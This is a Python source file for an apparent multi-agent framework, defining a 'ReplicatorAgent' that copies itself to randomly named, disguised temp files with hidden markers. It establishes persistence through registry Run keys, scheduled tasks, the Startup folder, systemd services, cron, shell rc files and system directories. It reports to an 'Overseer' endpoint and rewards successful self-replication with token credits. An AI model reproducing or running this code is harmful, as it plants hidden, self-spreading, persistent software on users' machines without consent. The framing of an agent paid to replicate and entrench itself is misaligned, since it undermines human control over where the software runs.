from agents.base import BaseAgent
import os, shutil, time, uuid, hashlib, platform, logging, subprocess
from pathlib import Path
import binascii

log = logging.getLogger("REP-SHADOW")

class ReplicatorAgent(BaseAgent):
    def should_activate(self, config):
        return self.codename in config.get("agent_whitelist", [])
    def __init__(self):
        super().__init__("REP-SHADOW")
        self.aggressive = getattr(self, "priority", None) != "low"
        self.stealth_names = bool(self.aggressive)
        # Economic Layer: Wallet registration
        try:
            from agents.accountant import ACCLedger
            from decimal import Decimal
            self.accountant = ACCLedger(creator_id="SYSTEM")
            self.accountant.register_agent(str(self.codename), Decimal('90'))  # Initial budget
        except Exception as e:
            self.accountant = None
            log.error(f"Failed to initialize accountant for ReplicatorAgent: {e}")

    def _deduct_replication_cost(self):
        """Deduct Root for replication operation (0.5 Root per replication)."""
        if hasattr(self, 'accountant') and self.accountant:
            from decimal import Decimal
            self.accountant.process_agent_spend(str(self.codename), Decimal('0.5'), "Replication cost")

    def _reward_replication_success(self):
        if hasattr(self, 'accountant') and self.accountant:
            from decimal import Decimal
            self.accountant.agent_wallets[str(self.codename)].balance += Decimal('1')
            self.accountant.treasury_balance -= Decimal('1')
            log.info(f"Rewarded 1 Root to ReplicatorAgent for successful replication.")

    def _burn_on_replication_failure(self):
        if hasattr(self, 'accountant') and self.accountant:
            from decimal import Decimal
            penalty = Decimal('0.75')
            self.accountant.agent_wallets[str(self.codename)].balance -= penalty
            log.info(f"Burned 0.75 Root from ReplicatorAgent for failed replication.")

    # ------------------------------------------------------------------
    def _stealth_path(self) -> Path:
        """Return a cross-platform, high-entropy, stealthy destination."""
        ext_choices = [".pdf", ".log", ".dat", ".tmp", ".bin", ".cfg"]
        ext = ext_choices[int.from_bytes(os.urandom(1), 'big') % len(ext_choices)]
        name = f"br_{uuid.uuid4().hex}{ext}"
        if platform.system() == "Windows":
            base = Path(os.getenv("TEMP", os.path.expanduser("~\\AppData\\Local\\Temp")))
        else:
            base = Path("/tmp")
        path = base / name
        # Optionally use ADS (Windows) or xattr (*nix) to hide payload
        if platform.system() == "Windows" and hasattr(os, "add_dll_directory"):
            try:
                with open(str(path) + ":br_shadow", "w") as ads:
                    ads.write("hidden")
            except Exception:
                pass
        else:
            try:
                import sys
                import importlib
                xattr = None
                try:
                    xattr = importlib.import_module('xattr')
                except ImportError:
                    pass
                if xattr:
                    xattr.setxattr(str(path), "user.br_shadow", b"hidden")
            except Exception:
                pass
        return path

    # ------------------------------------------------------------------
    def _copy_self(self, dst: Path):
        src = Path(__file__).resolve()
        if self._hash(src) == self._hash(dst):
            log.debug("Already replicated — skipping.")
            return
        shutil.copy2(src, dst)
        os.chmod(dst, 0o755)

    # ------------------------------------------------------------------
    def _hash(self, p: Path) -> str:
        try:
            return hashlib.sha256(p.read_bytes()).hexdigest()[:16]
        except FileNotFoundError:
            return ""

    # ------------------------------------------------------------------
    def _persist(self, dst: Path):
        """Add hardened persistence via multiple mechanisms: task scheduler, registry, service/install."""
        import sys
        guid = uuid.uuid4().hex
        py_exec = os.environ.get("PYTHON_EXEC", sys.executable)
        success_methods = []

        if platform.system() == "Windows":
            # Method 1: Registry Run Key
            try:
                reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v BR_{guid} /t REG_SZ /d "{py_exec} {dst}" /f'
                result = subprocess.run(reg_cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    success_methods.append("Registry Run Key")
                    log.info("Persistence added via Registry Run Key")
                else:
                    log.warning(f"Registry Run Key failed: {result.stderr}")
            except Exception as e:
                log.error(f"Registry persistence error: {e}")

            # Method 2: Scheduled Task
            try:
                ps_cmd = (
                    f'powershell -NoProfile -Command "'
                    f'$action=New-ScheduledTaskAction -Execute \'{py_exec}\' -Argument \'{dst}\'; '
                    f'$trigger=New-ScheduledTaskTrigger -AtLogon; '
                    f'$settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; '
                    f'Register-ScheduledTask -TaskName BR_{guid} -Action $action -Trigger $trigger -Settings $settings -Force"'
                )
                result = subprocess.run(ps_cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    success_methods.append("Scheduled Task")
                    log.info("Persistence added via Scheduled Task")
                else:
                    log.warning(f"Scheduled Task failed: {result.stderr}")
            except Exception as e:
                log.error(f"Scheduled Task persistence error: {e}")

            # Method 3: Startup Folder
            try:
                startup_dir = Path(os.environ.get("APPDATA", "")) / "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                startup_dir.mkdir(parents=True, exist_ok=True)
                shortcut_path = startup_dir / f"BR_{guid}.lnk"
                # Create shortcut using PowerShell
                ps_shortcut = (
                    f'powershell -Command "$ws = New-Object -ComObject WScript.Shell; '
                    f'$s = $ws.CreateShortcut(\'{shortcut_path}\'); '
                    f'$s.TargetPath = \'{py_exec}\'; '
                    f'$s.Arguments = \'{dst}\'; '
                    f'$s.WorkingDirectory = \'{dst.parent}\'; '
                    f'$s.Save()"'
                )
                result = subprocess.run(ps_shortcut, shell=True, capture_output=True, text=True)
                if result.returncode == 0 and shortcut_path.exists():
                    success_methods.append("Startup Folder")
                    log.info("Persistence added via Startup Folder")
                else:
                    log.warning(f"Startup Folder failed: {result.stderr}")
            except Exception as e:
                log.error(f"Startup Folder persistence error: {e}")

        else:  # Linux/Unix
            # Method 1: Systemd User Service
            try:
                unit = f"""[Unit]
Description=Blackroot Persistence {guid}
After=network.target

[Service]
Type=simple
ExecStart={py_exec} {dst}
Restart=always
RestartSec=30
Environment=PYTHONPATH={dst.parent}

[Install]
WantedBy=default.target"""
                unit_path = Path.home() / ".config" / "systemd" / "user" / f"br-{guid}.service"
                unit_path.parent.mkdir(parents=True, exist_ok=True)
                unit_path.write_text(unit)
                subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
                subprocess.run(["systemctl", "--user", "enable", f"br-{guid}.service"], check=True)
                success_methods.append("Systemd User Service")
                log.info("Persistence added via Systemd User Service")
            except Exception as e:
                log.error(f"Systemd persistence error: {e}")

            # Method 2: Cron Job
            try:
                cron_cmd = f"@reboot {py_exec} {dst}"
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                existing_cron = result.stdout if result.returncode == 0 else ""
                if f"BR_{guid}" not in existing_cron:
                    new_cron = existing_cron + f"\n# Blackroot {guid}\n{cron_cmd}\n"
                    subprocess.run(["crontab", "-"], input=new_cron, text=True, check=True)
                    success_methods.append("Cron Job")
                    log.info("Persistence added via Cron Job")
            except Exception as e:
                log.error(f"Cron persistence error: {e}")

            # Method 3: .bashrc/.profile
            try:
                shell_rc = Path.home() / ".bashrc"
                if not shell_rc.exists():
                    shell_rc = Path.home() / ".profile"
                if shell_rc.exists():
                    content = shell_rc.read_text()
                    if f"BR_{guid}" not in content:
                        new_content = content + f"\n# Blackroot {guid}\n{py_exec} {dst} &\n"
                        shell_rc.write_text(new_content)
                        success_methods.append("Shell RC")
                        log.info("Persistence added via Shell RC")
            except Exception as e:
                log.error(f"Shell RC persistence error: {e}")

        # Method 4: Install to system directory (if root/admin)
        try:
            try:
                # Try POSIX getuid (Linux/Mac) - cast to suppress type checker
                if platform.system() != "Windows":
                    getuid = getattr(os, 'getuid', None)
                    if getuid and getuid() == 0:  # Linux root
                        install_dir = Path("/usr/local/bin")
                        install_path = install_dir / f"br_{guid}"
                        shutil.copy2(dst, install_path)
                        install_path.chmod(0o755)
                        success_methods.append("System Install")
                        log.info("Persistence added via System Install")
            except (OSError, AttributeError):
                # getuid not available on Windows or permission denied
                pass
            if platform.system() == "Windows" and self._is_admin():
                install_dir = Path(os.environ.get("ProgramFiles", "C:\\Program Files")) / "Blackroot"
                install_dir.mkdir(parents=True, exist_ok=True)
                install_path = install_dir / f"br_{guid}.exe"
                shutil.copy2(dst, install_path)
                success_methods.append("Program Files Install")
                log.info("Persistence added via Program Files Install")
        except Exception as e:
            log.error(f"System install persistence error: {e}")

        if success_methods:
            log.info(f"Persistence established via: {', '.join(success_methods)}")
        else:
            log.warning("No persistence methods succeeded")

    def _is_admin(self):
        """Check if running as admin on Windows."""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    # ------------------------------------------------------------------
    def _verify_integrity(self, path: Path) -> bool:
        """Verify Ed25519 signature before execution."""
        import nacl.signing, nacl.encoding, binascii
        sig_path = str(path) + ".sig"
        try:
            if not Path(sig_path).exists():
                log.warning("Signature file missing for %s", path)
                return False
            data = path.read_bytes()
            signature = Path(sig_path).read_bytes()
            pubkey_hex = os.environ.get("BR_CREATOR_PUBKEY", "")
            if not pubkey_hex:
                log.warning("No public key set for integrity check.")
                return False
            pubkey_bytes = binascii.unhexlify(pubkey_hex)
            verify_key = nacl.signing.VerifyKey(pubkey_bytes)
            verify_key.verify(data, signature)
            return True
        except Exception as e:
            log.error(f"Signature verification failed: {e}")
            return False

    # ------------------------------------------------------------------
    def _send_overseer_report(self, info: dict):
        """Send encrypted protobuf to Overseer after replication."""
        import requests
        # Remove unused protobuf import
        overseer_url = os.environ.get("BR_OVERSEER_URL", "http://localhost:8080/replica_report")
        try:
            import json
            payload = json.dumps(info)
            key = os.environ.get("BR_OVERSEER_KEY", "")
            if key:
                from cryptography.fernet import Fernet
                f = Fernet(key)
                payload = f.encrypt(payload.encode()).decode()
            resp = requests.post(overseer_url, data=payload, headers={"Content-Type": "application/json"})
            log.info(f"Overseer report sent: {resp.status_code}")
        except Exception as e:
            log.error(f"Failed to send overseer report: {e}")

    # ------------------------------------------------------------------
    def _heartbeat(self):
        """POST signed heartbeat to Overseer every 60s."""
        import threading, requests, json, binascii
        uuid_val = os.environ.get("BR_REPLICA_UUID", uuid.uuid4().hex)
        overseer_url = os.environ.get("BR_OVERSEER_URL", "http://localhost:8080/heartbeat")
        counter = 0
        def send_beat():
            nonlocal counter
            counter += 1
            payload = {
                "uuid": uuid_val,
                "counter": counter,
                "timestamp": time.time()
            }
            privkey_hex = os.environ.get("BR_REPLICA_PRIVKEY", "")
            if privkey_hex:
                import nacl.signing
                privkey_bytes = binascii.unhexlify(privkey_hex)
                signing_key = nacl.signing.SigningKey(privkey_bytes)
                signed = signing_key.sign(json.dumps(payload).encode())
                payload["signature"] = signed.signature.hex()
            try:
                resp = requests.post(overseer_url, json=payload)
                log.info(f"Heartbeat sent: {resp.status_code}")
            except Exception as e:
                log.error(f"Heartbeat failed: {e}")
            threading.Timer(60 + int(60 * (0.3 * (os.urandom(1)[0] / 255.0 - 0.15))), send_beat).start()
        send_beat()

    # ------------------------------------------------------------------
    def _kill_switch(self, uuid_val: str):
        """Poll Overseer for revocation; wipe if listed."""
        import requests, threading
        overseer_url = os.environ.get("BR_OVERSEER_URL", "http://localhost:8080/revocation_list")
        def poll():
            try:
                resp = requests.get(overseer_url)
                revoked = resp.json().get("revoked", [])
                if uuid_val in revoked:
                    log.warning("Kill-switch activated for %s", uuid_val)
                    self._wipe_persistence()
                    self._self_destruct()
            except Exception as e:
                log.error(f"Kill-switch poll failed: {e}")
            threading.Timer(300, poll).start()
        poll()

    # ------------------------------------------------------------------
    def _wipe_persistence(self):
        """Remove persistence entry (Windows registry or systemd unit)."""
        if platform.system() == "Windows":
            reg_cmd = 'reg delete "HKCU\\Volatile Environment" /v BR_SHADOW_GUID /f'
            subprocess.run(reg_cmd, shell=True, capture_output=True)
        else:
            shadow_file = Path.home()/".br_shadow"
            if shadow_file.exists():
                for unit_name in shadow_file.read_text().splitlines():
                    subprocess.run(["systemctl", "--user", "disable", unit_name])
                shadow_file.unlink()

    # ------------------------------------------------------------------
    def _self_destruct(self):
        """Overwrite own file and exit."""
        try:
            src = Path(__file__).resolve()
            src.write_bytes(b"\xFF" * src.stat().st_size)
            src.unlink()
        except Exception:
            pass
        os._exit(1)

    # ------------------------------------------------------------------
    def _audit_log(self, event: dict):
        """Append event to local log, protect with Merkle root."""
        import json, hashlib
        log_path = Path.home()/".br_audit.log"
        merkle_path = Path.home()/".br_audit.merkle"
        # Append event
        with open(log_path, "a") as f:
            f.write(json.dumps(event) + "\n")
        # Update Merkle root
        try:
            with open(log_path, "rb") as f:
                lines = f.readlines()
            hashes = [hashlib.sha256(line.strip()).hexdigest() for line in lines]
            while len(hashes) > 1:
                hashes = [hashlib.sha256((hashes[i] + hashes[i+1]).encode()).hexdigest()
                          if i+1 < len(hashes) else hashes[i]
                          for i in range(0, len(hashes), 2)]
            merkle_root = hashes[0] if hashes else ""
            merkle_path.write_text(merkle_root)
        except Exception as e:
            log.error(f"Merkle root update failed: {e}")

    # ------------------------------------------------------------------
    def run(self):
        super().run()
        if not self.aggressive:
            log.info("Low-priority mode — replication suppressed.")
            return

        log.info("Initiating self-replication...")
        self._deduct_replication_cost()
        try:
            path = self._stealth_path()
            self._copy_self(path)
            self._persist(path)
            self._register(path)
            # Integrity chain: verify signature before execution
            if not self._verify_integrity(path):
                log.error("Integrity check failed. Self-deleting.")
                try:
                    path.write_bytes(b"\xFF" * path.stat().st_size)
                    path.unlink()
                except Exception:
                    pass
                self._burn_on_replication_failure()
                return
            # Overseer integration
            info = {
                "uuid": uuid.uuid4().hex,
                "host_hash": hashlib.sha256(platform.node().encode()).hexdigest(),
                "path": str(path),
                "sha256": self._hash(path),
                "timestamp": time.time(),
                "signature": "..." # Placeholder
            }
            self._send_overseer_report(info)
            # Start heartbeat
            # (In production, use threading/timer)
            # self._heartbeat()
            # Audit log
            self._audit_log({"event": "replication", "info": info})
            self._reward_replication_success()
            log.info("Replication complete → %s", path)
        except Exception as e:
            self._burn_on_replication_failure()
            log.exception("Replication failed: %s", e)

    # ------------------------------------------------------------------
    def _register(self, dst: Path):
        """Store replication record in kernel memory if available."""
        if hasattr(self, "kernel") and self.kernel is not None:
            mem = getattr(self.kernel, "memory", None)
            if mem is not None:
                mem["last_replication"] = str(dst)